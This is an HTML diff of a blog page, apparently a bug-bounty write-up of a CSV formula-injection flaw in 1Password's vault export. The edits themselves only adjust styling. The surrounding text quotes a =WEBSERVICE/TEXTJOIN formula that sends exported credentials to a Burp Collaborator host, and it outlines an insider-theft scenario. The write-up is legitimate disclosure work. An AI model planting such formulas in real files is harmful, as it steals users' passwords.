@@ -41,6 +41,16 @@
     <script src="/assets/js/theme.js"></script>
     <script src="/assets/js/dark_mode.js"></script>
     
+    <style>
+    table, table th, table td {
+  color: var(--global-text-color);
+  /* Optional: if you want lighter text for headers */
+  /* color: var(--global-text-color-light); */
+}
+
+
+    </style>
+
 
   </head>
 
@@ -182,9 +192,9 @@
     <code>=WEBSERVICE("http://co44j8hwdssqvr7oxa973o9bt2zwnmbb.oastify.com?" & TEXTJOIN("&", FALSE, B1:B20))</code> <br>This payload creates an HTTP GET request with the arguments <code>?Column&Value1&Value2&Value3</code> etc.</p>
           
     <p>Images of Burp Collaborator recieving the credentials:</p>
-    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-01.png">
-    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-02.png">
-    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-03.png">
+    <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/CSV1-01.png"><br>
+    <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/CSV1-02.png"><br>
+    <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/CSV1-03.png">
 
     <p><br>The sites, usernames, and passwords were exfiltrated in 3 different requests which can be recreated to make a table as shown above.</p>
     
@@ -198,14 +208,15 @@
     <p>The threat profile for this vulnerability is a malicious insider. Someone from HR or IT instructs an employee from finance to perform a test backup of their password manager, and then steals the user's credentials to banks and/or financial services.</p>
     
     <p>The following image shows the payload being added to a shared vault by the malicious insider:</p>
-    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-05.png">
+    <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/CSV1-05.png">
 
     <p><br>The following image shows the payload recieved in the victims account, along with other shared credentials:</p>
-    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-06.png">
+    <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/CSV1-06.png">
 
     <p><br>The following images show the process for the victim to export their private vault:</p>
-    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-07.png">
-    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-04.png">
+    <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/CSV1-07.png">
+    <br><br>
+    <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/CSV1-04.png">
     
     <p><br>The results of the exfiltration was shown above in the images of Burp Collaborator, it included the private passwords for the user. This was a successful proof of concept for the exploit!</p>
 
@@ -223,7 +234,7 @@
 
     <p>Even though I didn't get a bounty this time, I was grateful to 1Password for the engagement and leaving a public review on my HackerOne Profile.</p>
 
-    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-08.png">
+    <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/CSV1-08.png">
 
     <p><br></p>
     <h2>Lesson</h2>
@@ -247,24 +258,6 @@
       
     </ul>
     <p><br></p>
-
-
-
-
-
-
-
-
-
-
-
-        
-
-
-
-
-
-
 
 
 
